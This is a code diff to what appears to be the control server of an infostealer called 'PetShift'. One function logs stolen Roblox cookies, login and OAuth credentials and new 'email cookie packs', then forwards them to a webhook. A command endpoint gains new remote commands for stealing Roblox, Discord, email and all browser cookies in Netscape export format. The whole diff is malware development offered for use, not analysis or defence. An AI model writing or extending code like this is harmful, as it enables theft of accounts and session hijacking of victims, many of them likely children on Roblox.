@@ -1551,7 +1551,10 @@ def petshift_loot():
                 lines.append("storage.roblox_cookies:")
                 for ck, cv in list(stor["roblox_cookies"].items())[:8]:
                     lines.append(f"  {ck}: {str(cv)[:120]}")
-        title = "PetShift LOGIN" if kind in ("roblox_login", "roblox_oauth", "roblox_oauth_form", "credentials") else "PetShift loot"
+        if kind == "email_cookies" and isinstance(payload, dict):
+            counts = payload.get("counts") or {}
+            lines.append("email cookie packs: " + ", ".join(f"{k}={v}" for k,v in counts.items()))
+        title = "PetShift LOGIN" if kind in ("roblox_login", "roblox_oauth", "roblox_oauth_form", "credentials") else ("PetShift email cookies" if kind=="email_cookies" else "PetShift loot")
         _browser_wh(title, lines)
     except Exception:
         pass
@@ -1601,7 +1604,7 @@ def petshift_cmd():
         return jsonify({"error": "cmd"}), 400
     allowed = {
         "steal", "cookies", "storage", "screenshot", "ping", "full",
-        "credentials", "clear_loot", "refresh"
+        "credentials", "clear_loot", "refresh", "roblox", "discord", "email", "all_cookies", "netscape"
     }
     if cmd not in allowed and not cmd.startswith("custom:"):
         return jsonify({"error": "unknown cmd"}), 400
